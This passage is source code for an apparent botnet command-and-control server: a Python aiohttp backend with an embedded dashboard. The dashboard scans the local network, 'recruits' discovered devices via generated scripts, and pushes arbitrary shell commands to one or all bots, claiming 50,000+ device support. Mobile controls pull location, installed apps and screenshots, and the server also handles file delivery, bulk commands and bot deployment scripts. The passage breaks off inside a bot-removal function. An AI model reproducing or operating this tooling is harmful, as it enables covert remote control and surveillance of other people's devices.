                                <div class="discovery-details">
                                    OS: ${device.os || 'Unknown'} | 
                                    Ports: ${device.open_ports?.join(', ') || 'None'} |
                                    Status: ${device.status || 'Unknown'}
                                </div>
                            </div>
                            <button class="btn btn-secondary" onclick="recruitDevice('${device.ip}', '${device.os}')">
                                RECRUIT
                            </button>
                        `;
                        container.appendChild(deviceDiv);
                    });
                } else {
                    container.innerHTML = '<div class="discovery-item">No devices discovered yet. Click "SCAN LOCAL NETWORK" to start.</div>';
                }
            } catch (error) {
                console.error('Failed to refresh discovery results:', error);
            }
        };
        
        window.recruitDevice = async function(ip, os) {
            try {
                const result = await api('/api/discover/recruit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target_ip: ip, target_os: os })
                });
                
                if (result.status === 'success') {
                    appendToTerminal(`🎯 Recruitment script generated for ${ip}`, 'success');
                    appendToTerminal('📝 Deployment Script:', 'info');
                    appendToTerminal(result.recruitment_script, 'code');
                } else {
                    appendToTerminal(`❌ Recruitment failed: ${result.error}`, 'error');
                }
            } catch (error) {
                appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
            }
        };
        
        // Resource Optimization Functions
        window.showResourceOptimization = function() {
            const panel = document.getElementById('resourceOptimizationPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        };
        
        window.autoOptimizeResources = async function() {
            appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
            
            try {
                const result = await api('/api/optimization/apply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ auto_optimize: true })
                });
                
                if (result.status === 'success') {
                    appendToTerminal('✅ Resource optimization completed', 'success');
                    appendToTerminal(`📊 New Limits: ${result.new_limits.max_devices} devices, ${result.new_limits.max_workers} workers, ${result.new_limits.max_memory_mb}MB memory`, 'info');
                    
                    // Update optimization results panel
                    const resultsDiv = document.getElementById('optimizationResults');
                    resultsDiv.innerHTML = `
                        <div style="color: #00ff9f;">✅ System Optimized</div>
                        <div style="font-size: 12px; margin-top: 0.5rem;">
                            Max Devices: ${result.new_limits.max_devices}<br>
                            Workers: ${result.new_limits.max_workers}<br>
                            Memory Limit: ${result.new_limits.max_memory_mb}MB
                        </div>
                    `;
                } else {
                    appendToTerminal(`❌ Optimization failed: ${result.error}`, 'error');
                }
            } catch (error) {
                appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
            }
        };
        
        // Device Terminal Functions
        let deviceTerminalConnected = false;
        let deviceTerminalSession = null;
        
        window.initializeDeviceTerminal = function() {
            deviceTerminalConnected = true;
            document.getElementById('deviceTerminalStatus').textContent = 'Connected';
            document.getElementById('deviceTerminalStatus').style.color = '#00ff9f';
            document.getElementById('deviceTerminalInput').disabled = false;
            document.getElementById('deviceTerminalExecuteBtn').disabled = false;
            
            appendToDeviceTerminal('🚀 Device terminal connection established', 'success');
            appendToDeviceTerminal('Ready for command input. Type commands and press Enter.', 'info');
            appendToDeviceTerminal('', 'info'); // Add spacing
            
            // Focus on input
            document.getElementById('deviceTerminalInput').focus();
        }
        
        function clearDeviceTerminal() {
            document.getElementById('deviceTerminalOutput').innerHTML = `
                <div style="color: #00ff9f;">
                    Device Terminal - Session Cleared<br>
                    ===================================<br><br>
                    Terminal ready for new commands.<br><br>
                </div>
            `;
        }
        
        function exportDeviceTerminal() {
            const output = document.getElementById('deviceTerminalOutput');
            const logs = output.textContent;
            const blob = new Blob([logs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `device-terminal-log-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            appendToDeviceTerminal('📄 Terminal log exported', 'info');
        }
        
        function handleDeviceTerminalKeyPress(event) {
            if (event.key === 'Enter') {
                executeDeviceTerminalCommand();
            }
        }
        
        function executeDeviceTerminalCommand() {
            const input = document.getElementById('deviceTerminalInput');
            const command = input.value.trim();
            
            if (!command) return;
            
            sendDeviceTerminalCommand(command);
            input.value = '';
        }
        
        function sendDeviceTerminalCommand(command) {
            if (!deviceTerminalConnected) {
                appendToDeviceTerminal('❌ Terminal not connected. Click "CONNECT TO DEVICE" first.', 'error');
                return;
            }
            
            // Display command being executed
            appendToDeviceTerminal(`$ ${command}`, 'command');
            
            // Execute via API with device terminal context
            api('/api/terminal/execute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    target: 'all', 
                    command: command, 
                    user_context: 'device_terminal',
                    direct_mode: true 
                })
            }).then(result => {
                if (result.status === 'success') {
                    const executionResult = result.execution_result;
                    
                    if (executionResult.results && executionResult.results.length > 0) {
                        const deviceResult = executionResult.results[0];
                        
                        if (deviceResult.success) {
                            if (deviceResult.output && deviceResult.output.trim()) {
                                // Display command output line by line
                                const outputLines = deviceResult.output.split('\\n');
                                outputLines.forEach(line => {
                                    if (line.trim() || outputLines.length === 1) {
                                        appendToDeviceTerminal(line, 'output');
                                    }
                                });
                            } else {
                                appendToDeviceTerminal('(no output)', 'info');
                            }
                            
                            if (deviceResult.execution_time) {
                                appendToDeviceTerminal(`⏱️ Completed in ${deviceResult.execution_time.toFixed(3)}s`, 'timing');
                            }
                        } else {
                            appendToDeviceTerminal(`❌ Error: ${deviceResult.error || 'Command failed'}`, 'error');
                        }
                    } else {
                        appendToDeviceTerminal('❌ No response from device', 'error');
                    }
                } else {
                    appendToDeviceTerminal(`❌ Execution failed: ${result.error}`, 'error');
                }
                
                appendToDeviceTerminal('', 'info'); // Add spacing after command
            }).catch(error => {
                appendToDeviceTerminal(`❌ API Error: ${error.message}`, 'error');
                appendToDeviceTerminal('', 'info');
            });
        }
        
        function appendToDeviceTerminal(message, type = 'info') {
            const output = document.getElementById('deviceTerminalOutput');
            const div = document.createElement('div');
            
            // Color coding for different types
            let color = '#fff';
            switch(type) {
                case 'success': color = '#00ff9f'; break;
                case 'error': color = '#ff0080'; break;
                case 'info': color = '#0080ff'; break;
                case 'command': color = '#ffaa00'; break;
                case 'output': color = '#ccc'; break;
                case 'timing': color = '#888'; break;
            }
            
            div.style.color = color;
            div.style.marginBottom = '0.1rem';
            div.textContent = message;
            
            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
            
            // Keep only last 200 lines for performance
            while (output.children.length > 200) {
                output.removeChild(output.firstChild);
            }
        }
        
        // Add device terminal functions to global scope
        window.initializeDeviceTerminal = initializeDeviceTerminal;
        window.clearDeviceTerminal = clearDeviceTerminal;
        window.exportDeviceTerminal = exportDeviceTerminal;
        window.handleDeviceTerminalKeyPress = handleDeviceTerminalKeyPress;
        window.executeDeviceTerminalCommand = executeDeviceTerminalCommand;
        window.sendDeviceTerminalCommand = sendDeviceTerminalCommand;
        
        // Add missing switchTab function to global scope
        window.switchTab = switchTab;
        
        // Update sendCommand to use enhanced terminal
        function sendCommand() {
            sendTerminalCommand();
        }
        
        // Auto-refresh and initialization - Optimized intervals to reduce CPU load
        setInterval(refreshDevices, 15000);  // Reduced from 3s to 15s
        setInterval(updateUptime, 10000);    // Reduced from 1s to 10s  
        setInterval(simulateSystemLoad, 30000); // Reduced from 5s to 30s
        
        // Initialize immediately
        refreshDevices();
        updateUptime();
        simulateSystemLoad();
        updateBotStats();
        
        // Refresh again after 2 seconds to ensure control bot is loaded
        setTimeout(() => {
            refreshDevices();
            appendToActivityLog('🔄 Initial device sync complete');
        }, 2000);
        
        // Add localStorage support for persistence
        // Save UI state periodically
        setInterval(() => {
            try {
                const state = {
                    lastSync: Date.now(),
                    deviceCount: document.querySelectorAll('.device-item').length,
                    onlineCount: document.querySelectorAll('.device-status.online').length,
                    commandCount: commandCount,
                    successfulCommands: successfulCommands
                };
                localStorage.setItem('unifiedControlState', JSON.stringify(state));
            } catch (e) {
                console.warn('localStorage save failed:', e);
            }
        }, 5000);
        
        // Restore state on load if available
        try {
            const savedState = localStorage.getItem('unifiedControlState');
            if (savedState) {
                const state = JSON.parse(savedState);
                const timeSinceSync = Date.now() - state.lastSync;
                if (timeSinceSync < 60000) { // Less than 1 minute ago
                    appendToActivityLog(`📦 Restored previous session state (${Math.floor(timeSinceSync/1000)}s ago)`);
                    commandCount = state.commandCount || 0;
                    successfulCommands = state.successfulCommands || 0;
                }
            }
        } catch (e) {
            console.warn('localStorage restore failed:', e);
        }
        
        appendToActivityLog('🚀 Advanced Bot Network Control Center initialized');
        appendToActivityLog('📡 50,000+ device support enabled');
        appendToActivityLog('🤖 Real terminal mode with device discovery active');
        
        // Initialize bot results panel
        appendToBotResults('🚀 Bot operations panel initialized');
        appendToBotResults('📊 Ready to execute network operations');
        
        // Global variable for current bot control
        let currentControlledBot = null;
        
        // Bot Control Panel Functions
        window.openBotControlPanel = function(botId, botInfo) {
            currentControlledBot = botId;
            document.getElementById('botControlPanel').style.display = 'flex';
            document.getElementById('botControlTitle').textContent = `Bot: ${botId}`;
            
            // Populate bot information
            const detailsDiv = document.getElementById('botInfoDetails');
            detailsDiv.innerHTML = `
                <div style="font-size: 12px; color: #ccc;">
                    <p><strong>🆔 ID:</strong> ${botId}</p>
                    <p><strong>📍 Status:</strong> <span style="color: #00ff9f;">Online</span></p>
                    <p><strong>🏷️ Tags:</strong> ${botInfo?.tags?.join(', ') || 'Unknown'}</p>
                    <p><strong>⏰ Last Seen:</strong> ${new Date().toLocaleString()}</p>
                    <p><strong>🖥️ Platform:</strong> ${botInfo?.platform || 'Unknown'}</p>
                    <p><strong>📡 IP:</strong> ${botInfo?.ip || 'Unknown'}</p>
                </div>
            `;
            
            // Show mobile controls if it's a mobile device
            const mobileControls = document.getElementById('mobileControls');
            if (botInfo?.tags?.includes('mobile') || botInfo?.tags?.includes('android')) {
                mobileControls.style.display = 'block';
            } else {
                mobileControls.style.display = 'none';
            }
            
            // Clear previous terminal content
            clearBotTerminal();
            appendToBotTerminal(`🤖 Connected to bot: ${botId}`, 'success');
        };
        
        window.closeBotControlPanel = function() {
            document.getElementById('botControlPanel').style.display = 'none';
            currentControlledBot = null;
        };
        
        function sendBotCommand(commandType) {
            if (!currentControlledBot) return;
            
            const commands = {
                'status': 'echo "Bot Status: Online" && uptime',
                'info': 'uname -a && whoami',
                'processes': 'ps aux | head -10',
                'network': 'ip addr show | head -20',
                'performance': 'free -h && df -h',
                'logs': 'tail -20 /var/log/syslog 2>/dev/null || tail -20 /var/log/messages 2>/dev/null || echo "No logs available"',
                'battery': 'termux-battery-status 2>/dev/null || acpi -b 2>/dev/null || echo "Battery info not available"',
                'location': 'termux-location 2>/dev/null || echo "Location not available"',
                'apps': 'pm list packages 2>/dev/null | head -10 || echo "App list not available"'
            };
            
            const command = commands[commandType];
            if (command) {
                appendToBotTerminal(`📤 Executing ${commandType}...`, 'info');
                sendBotTerminalCommandDirect(command);
            }
        }
        
        function sendBotTerminalCommand() {
            const command = document.getElementById('botCommandInput').value.trim();
            if (!command || !currentControlledBot) return;
            
            sendBotTerminalCommandDirect(command);
            document.getElementById('botCommandInput').value = '';
        }
        
        function sendBotTerminalCommandDirect(command) {
            if (!currentControlledBot) return;
            
            appendToBotTerminal(`📤 [${currentControlledBot}] ${command}`, 'command');
            
            // Execute command on specific bot
            api('/api/terminal/execute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    target: `id:${currentControlledBot}`, 
                    command: command, 
                    user_context: 'bot_control_panel' 
                })
            }).then(result => {
                if (result.status === 'success') {
                    const executionResult = result.execution_result;
                    if (executionResult.results && executionResult.results.length > 0) {
                        const botResult = executionResult.results[0];
                        if (botResult.success && botResult.output) {
                            appendToBotTerminal(`💬 Output:`, 'info');
                            const outputLines = botResult.output.split('\\n');
                            outputLines.forEach(line => {
                                if (line.trim()) {
                                    appendToBotTerminal(`  ${line}`, 'output');
                                }
                            });
                        } else {
                            appendToBotTerminal(`❌ ${botResult.error || 'Command failed'}`, 'error');
                        }
                    } else {
                        appendToBotTerminal(`❌ No response from bot`, 'error');
                    }
                } else {
                    appendToBotTerminal(`❌ Execution failed: ${result.error}`, 'error');
                }
            }).catch(error => {
                appendToBotTerminal(`❌ API Error: ${error.message}`, 'error');
            });
        }
        
        function handleBotCommandKeyPress(event) {
            if (event.key === 'Enter') {
                sendBotTerminalCommand();
            }
        }
        
        function appendToBotTerminal(message, type = 'info') {
            const terminal = document.getElementById('botTerminal');
            const timestamp = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = `terminal-line terminal-${type}`;
            div.innerHTML = `<span class="terminal-timestamp">[${timestamp}]</span> ${message}`;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
            
            // Keep only last 100 entries
            while (terminal.children.length > 100) {
                terminal.removeChild(terminal.firstChild);
            }
        }
        
        function clearBotTerminal() {
            document.getElementById('botTerminal').innerHTML = `
                <div class="terminal-line terminal-info">
                    <span class="terminal-timestamp">[BOT]</span> 
                    🤖 Bot terminal ready - Direct communication established
                </div>
            `;
        }
        
        function exportBotLogs() {
            const terminal = document.getElementById('botTerminal');
            const logs = Array.from(terminal.children).map(child => child.textContent).join('\\n');
            const blob = new Blob([logs], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `bot-${currentControlledBot}-logs-${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
        
        function startScreenMirror() {
            const mirrorArea = document.getElementById('screenMirrorArea');
            mirrorArea.style.display = 'block';
            appendToBotTerminal('📱 Starting screen mirror...', 'info');
            
            // Simulate screen mirroring (placeholder for actual implementation)
            const canvas = document.getElementById('screenMirrorCanvas');
            canvas.innerHTML = `
                <div style="text-align: center; color: #00ff9f;">
                    📱 Screen Mirror Active<br>
                    <small>Bot: ${currentControlledBot}</small><br>
                    <div style="margin-top: 1rem; font-size: 12px; color: #666;">
                        Note: Actual screen mirroring requires<br>
                        device-specific implementation (ADB for Android)
                    </div>
                </div>
            `;
        }
        
        function takeScreenshot() {
            if (!currentControlledBot) return;
            appendToBotTerminal('📸 Taking screenshot...', 'info');
            sendBotTerminalCommandDirect('screencap /sdcard/screenshot.png 2>/dev/null && echo "Screenshot saved" || echo "Screenshot failed"');
        }
        
        function refreshScreen() {
            appendToBotTerminal('🔄 Refreshing screen...', 'info');
        }
        
        function toggleScreenControl() {
            appendToBotTerminal('🎮 Screen control mode toggled', 'info');
        }
        
        function restartBot() {
            if (!currentControlledBot) return;
            if (confirm(`Are you sure you want to restart bot ${currentControlledBot}?`)) {
                appendToBotTerminal('🔄 Restarting bot...', 'warning');
                sendBotTerminalCommandDirect('echo "Restart command sent" && sleep 2 && echo "Bot would restart here"');
            }
        }
        
        function disconnectBot() {
            if (!currentControlledBot) return;
            if (confirm(`Are you sure you want to disconnect bot ${currentControlledBot}?`)) {
                appendToBotTerminal('🔌 Disconnecting bot...', 'warning');
                closeBotControlPanel();
            }
        }
    </script>
    
    <!-- Individual Bot Control Panel -->
    <div id="botControlPanel" class="modal" style="display: none;">
        <div class="modal-content" style="max-width: 1200px; height: 80vh;">
            <div class="modal-header">
                <h3>🤖 Bot Control Center</h3>
                <span class="close" onclick="closeBotControlPanel()">&times;</span>
            </div>
            <div class="modal-body" style="height: calc(100% - 80px); overflow: hidden;">
                <div id="botControlContent" style="height: 100%; display: grid; grid-template-columns: 1fr 2fr; gap: 1rem;">
                    <!-- Bot Information Panel -->
                    <div class="panel" style="padding: 1rem;">
                        <h4 id="botControlTitle">Bot Information</h4>
                        <div id="botInfoDetails"></div>
                        
                        <div class="bot-control-section" style="margin-top: 1rem;">
                            <h5>🎛️ Direct Controls</h5>
                            <div class="bot-controls" style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem;">
                                <button class="btn btn-secondary" onclick="sendBotCommand('status')">Status</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('info')">System Info</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('processes')">Processes</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('network')">Network</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('performance')">Performance</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('logs')">Recent Logs</button>
                            </div>
                        </div>
                        
                        <div class="bot-control-section" style="margin-top: 1rem;">
                            <h5>📱 Mobile Controls</h5>
                            <div id="mobileControls" style="display: none;">
                                <button class="btn" onclick="startScreenMirror()">🖼️ Screen Mirror</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('battery')">🔋 Battery</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('location')">📍 Location</button>
                                <button class="btn btn-secondary" onclick="sendBotCommand('apps')">📱 Apps</button>
                            </div>
                        </div>
                        
                        <div class="bot-control-section" style="margin-top: 1rem;">
                            <h5>⚙️ Advanced</h5>
                            <button class="btn btn-warning" onclick="restartBot()">🔄 Restart Bot</button>
                            <button class="btn btn-danger" onclick="disconnectBot()">🔌 Disconnect</button>
                        </div>
                    </div>
                    
                    <!-- Bot Terminal/Output Panel -->
                    <div class="panel" style="padding: 1rem; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                            <h4>🖥️ Bot Terminal</h4>
                            <div>
                                <button class="btn btn-secondary" onclick="clearBotTerminal()">Clear</button>
                                <button class="btn btn-secondary" onclick="exportBotLogs()">Export</button>
                            </div>
                        </div>
                        
                        <div class="terminal" id="botTerminal" style="flex: 1; max-height: 300px; overflow-y: auto;">
                            <div class="terminal-line terminal-info">
                                <span class="terminal-timestamp">[BOT]</span> 
                                🤖 Bot terminal ready - Direct communication established
                            </div>
                        </div>
                        
                        <div style="margin-top: 1rem;">
                            <div style="display: flex; gap: 0.5rem;">
                                <input type="text" id="botCommandInput" class="command-input" 
                                       placeholder="Enter command for this bot..." 
                                       onkeypress="handleBotCommandKeyPress(event)" style="flex: 1;">
                                <button class="btn" onclick="sendBotTerminalCommand()">Execute</button>
                            </div>
                        </div>
                        
                        <!-- Screen Mirror Area (for mobile devices) -->
                        <div id="screenMirrorArea" style="display: none; margin-top: 1rem;">
                            <h5>📱 Screen Mirror</h5>
                            <div id="screenMirrorCanvas" style="border: 1px solid #00ff9f; border-radius: 8px; min-height: 200px; display: flex; align-items: center; justify-content: center; background: #1a1a2e;">
                                <div style="text-align: center; color: #666;">
                                    📱 Screen mirroring will appear here<br>
                                    <small>Requires device with screen sharing capability</small>
                                </div>
                            </div>
                            <div style="margin-top: 0.5rem; text-align: center;">
                                <button class="btn btn-secondary" onclick="takeScreenshot()">📸 Screenshot</button>
                                <button class="btn btn-secondary" onclick="refreshScreen()">🔄 Refresh</button>
                                <button class="btn btn-secondary" onclick="toggleScreenControl()">🎮 Control</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Modal Styles -->
    <style>
    .modal {
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0,0,0,0.8);
        display: flex;
        align-items: center;
        justify-content: center;
    }
    
    .modal-content {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        border: 2px solid #00ff9f;
        border-radius: 12px;
        max-width: 90%;
        max-height: 90%;
        box-shadow: 0 10px 30px rgba(0, 255, 159, 0.3);
    }
    
    .modal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1rem;
        border-bottom: 1px solid #00ff9f;
    }
    
    .modal-header h3 {
        margin: 0;
        color: #00ff9f;
    }
    
    .close {
        color: #ff0080;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }
    
    .close:hover {
        color: #ffffff;
    }
    
    .bot-control-section {
        border-top: 1px solid #333;
        padding-top: 0.5rem;
    }
    
    .bot-control-section h5 {
        margin: 0 0 0.5rem 0;
        color: #0080ff;
        font-size: 14px;
    }
    
    .bot-controls button {
        font-size: 12px;
        padding: 0.3rem 0.6rem;
    }
    </style>
</body>
</html>"""
async def route_ui(request):
    """Serve main UI page"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.Response(text="❌ Unauthorized - Valid token required", status=401)
    return web.Response(text=UI_HTML, content_type="text/html")

async def api_upload(request):
    """Handle file upload"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        reader = await request.multipart()
        field = await reader.next()
        
        if not field or field.name != "file":
            return web.json_response({"error": "no file field"}, status=400)
        
        filename = field.filename
        if not filename:
            return web.json_response({"error": "no filename"}, status=400)
        
        # Create upload directory
        safe_mkdir(UPLOAD_DIR)
        
        # Generate unique file ID and path
        file_id = str(uuid.uuid4())
        safe_filename = "".join(c for c in filename if c.isalnum() or c in ".-_")
        file_path = os.path.join(UPLOAD_DIR, f"{file_id}_{safe_filename}")
        
        # Write file with size limit
        size = 0
        with open(file_path, 'wb') as f:
            while True:
                chunk = await field.read_chunk()
                if not chunk:
                    break
                size += len(chunk)
                if size > MAX_UPLOAD_SIZE:
                    f.close()
                    os.remove(file_path)
                    return web.json_response({"error": "file too large"}, status=413)
                f.write(chunk)
        
        # Add to database
        db.add_upload(file_id, filename, file_path, size, "web")
        
        logging.info(f"File uploaded: {filename} ({size} bytes, ID: {file_id})")
        
        return web.json_response({
            "id": file_id,
            "filename": filename,
            "size": size,
            "status": "uploaded"
        })
        
    except Exception as e:
        logging.error(f"Upload error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_list_uploads(request):
    """List uploaded files"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    uploads = db.list_uploads()
    return web.json_response({"uploads": uploads})

async def api_serve_file(request):
    """Serve file to device"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.Response(text="unauthorized", status=401)
    
    file_id = request.match_info.get("file_id")
    upload = db.get_upload(file_id)
    
    if not upload:
        return web.Response(text="file not found", status=404)
    
    if not os.path.exists(upload["path"]):
        return web.Response(text="file no longer available", status=404)
    
    return web.FileResponse(upload["path"])

async def api_devices(request):
    """List connected devices"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    devices = []
    async with clients_lock:
        for client_id, client_info in clients.items():
            devices.append({
                "id": client_id,
                "tags": client_info["meta"].get("tags", []),
                "exec_allowed": bool(client_info["meta"].get("exec_allowed", False)),
                "last_seen": client_info["last_seen"]
            })
    
    return web.json_response({"devices": devices})

async def api_send_command(request):
    """Send command to devices"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        target = data.get("target")
        command = data.get("cmd")
        
        if not target or not command:
            return web.json_response({"error": "missing target or command"}, status=400)
        
        result = await send_command_to_spec(target, command)
        return web.json_response(result)
        
    except Exception as e:
        logging.error(f"Command send error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_load_balanced_send(request):
    """Send command via load balancer"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        target = data.get("target")
        command = data.get("cmd")
        
        if not target or not command:
            return web.json_response({"error": "missing target or command"}, status=400)
        
        if load_balancer:
            result = await load_balancer.queue_command(target, command)
            return web.json_response(result)
        else:
            return web.json_response({"error": "load_balancer_not_available"}, status=503)
        
    except Exception as e:
        logging.error(f"Load balanced send error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_device_groups(request):
    """Manage device groups"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    if request.method == 'GET':
        return web.json_response({"groups": device_manager.groups})
    
    elif request.method == 'POST':
        try:
            data = await request.json()
            device_id = data.get("device_id")
            group = data.get("group")
            action = data.get("action", "add")
            
            if not device_id or not group:
                return web.json_response({"error": "missing device_id or group"}, status=400)
            
            if action == "add":
                device_manager.add_device_to_group(device_id, group)
            elif action == "remove":
                device_manager.remove_device_from_group(device_id, group)
            
            return web.json_response({"status": "success", "groups": device_manager.groups})
        
        except Exception as e:
            return web.json_response({"error": str(e)}, status=500)

async def api_device_services(request):
    """Manage device services"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    if request.method == 'GET':
        device_id = request.query.get("device_id")
        if device_id:
            services = device_manager.get_device_services(device_id)
            return web.json_response({"services": services})
        else:
            all_services = device_manager.get_all_services()
            return web.json_response({"services": all_services})
    
    elif request.method == 'POST':
        try:
            data = await request.json()
            device_id = data.get("device_id")
            service_name = data.get("service_name")
            file_path = data.get("file_path")
            auto_restart = data.get("auto_restart", True)
            
            if not device_id or not service_name or not file_path:
                return web.json_response({"error": "missing required fields"}, status=400)
            
            result = await service_manager.deploy_service(device_id, service_name, file_path, auto_restart)
            return web.json_response(result)
        
        except Exception as e:
            return web.json_response({"error": str(e)}, status=500)

async def api_system_stats(request):
    """Get comprehensive system statistics"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        # Collect system metrics with fallbacks for restricted environments
        memory_usage = "N/A"
        cpu_usage = "N/A"
        disk_usage = "N/A"
        
        try:
            memory_usage = f"{psutil.virtual_memory().percent:.1f}%"
        except (PermissionError, OSError):
            pass
        
        try:
            cpu_usage = f"{psutil.cpu_percent(interval=0):.1f}%"  # Non-blocking
        except (PermissionError, OSError):
            pass
        
        try:
            disk_usage = f"{psutil.disk_usage('/').percent:.1f}%"
        except (PermissionError, OSError):
            pass
        
        # Collect enhanced system statistics
        stats = {
            "devices": {
                "total": len(clients),
                "online": sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60),
                "exec_allowed": sum(1 for c in clients.values() if c.get("meta", {}).get("exec_allowed", False)),
                "offline": len(clients) - sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60)
            },
            "load_balancer": {
                "active": load_balancer is not None,
                "queue_size": command_queue.qsize() if load_balancer else 0,
                "worker_count": len(load_balancer.workers) if load_balancer else 0
            },
            "services": {
                "total": len(service_manager.services),
                "running": sum(1 for s in service_manager.services.values() if s.get("status") == "deployed")
            },
            "system": {
                "uptime": time.time() - start_time,
                "memory_usage": memory_usage,
                "cpu_usage": cpu_usage,
                "disk_usage": disk_usage,
                "max_devices": MAX_DEVICES,
                "max_workers": MAX_CONCURRENT_COMMANDS,
                "max_memory_mb": MAX_MEMORY_MB
            },
            "terminal": {
                "commands_executed": len(terminal_interface.command_history),
                "active_sessions": len(terminal_interface.active_sessions)
            }
        }
        
        # Add enhanced stats from persistent storage if available
        if persistent_storage:
            try:
                enhanced_stats = persistent_storage.get_system_stats()
                stats["analytics"] = enhanced_stats
                
                # Record current metrics for future analysis
                persistent_storage.track_system_metrics()
            except Exception as e:
                logging.debug(f"Failed to get enhanced stats: {e}")
                stats["analytics"] = {"error": "analytics unavailable"}
        
        return web.json_response(stats)
        
    except Exception as e:
        logging.error(f"Failed to get system stats: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_bulk_command(request):
    """Execute commands on multiple devices efficiently"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        commands = data.get("commands", [])  # List of {target, command}
        
        if not commands:
            return web.json_response({"error": "no commands provided"}, status=400)
        
        results = []
        for cmd_data in commands:
            target = cmd_data.get("target")
            command = cmd_data.get("command")
            
            if target and command:
                if load_balancer:
                    result = await load_balancer.queue_command(target, command)
                else:
                    result = await send_command_to_spec(target, command)
                results.append({"target": target, "command": command, "result": result})
        
        return web.json_response({"results": results})
        
    except Exception as e:
        logging.error(f"Bulk command error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_create_bot(request):
    """Create a new bot/device"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        bot_type = data.get("bot_type", "mobile")
        bot_id = data.get("bot_id")
        tags = data.get("tags", [bot_type])
        exec_allowed = data.get("exec_allowed", True)
        
        if not bot_id:
            bot_id = f"{bot_type}-{int(time.time())}"
        
        # Generate bot deployment script
        bot_script = generate_bot_script(bot_id, bot_type, tags, exec_allowed)
        
        # Store bot configuration
        bot_config = {
            "bot_id": bot_id,
            "bot_type": bot_type,
            "tags": tags,
            "exec_allowed": exec_allowed,
            "created_at": time.time(),
            "script": bot_script,
            "status": "created"
        }
        
        # Add to device manager
        device_manager.add_device_to_group(bot_id, bot_type)
        for tag in tags:
            device_manager.add_device_to_group(bot_id, tag)
        
        return web.json_response({
            "status": "success",
            "bot_id": bot_id,
            "bot_type": bot_type,
            "deployment_script": bot_script,
            "config": bot_config
        })
        
    except Exception as e:
        logging.error(f"Bot creation error: {e}")
        return web.json_response({"error": str(e)}, status=500)

async def api_remove_bot(request):
    """Remove a bot/device"""
    token = request.query.get("token", "")
    if token != AUTH_TOKEN:
        return web.json_response({"error": "unauthorized"}, status=401)
    
    try:
        data = await request.json()
        bot_id = data.get("bot_id")
        
        if not bot_id:
            return web.json_response({"error": "bot_id required"}, status=400)
        
        # Remove from all groups
        for group in list(device_manager.groups.keys()):
            device_manager.remove_device_from_group(bot_id, group)
        
        # Disconnect if online
        async with clients_lock:
            if bot_id in clients:
                try:
                    await clients[bot_id]["websocket"].send(json.dumps({
                        "type": "shutdown",
                        "message": "Bot removed from network"
                    }))
                    del clients[bot_id]
                except:
                    pass
        
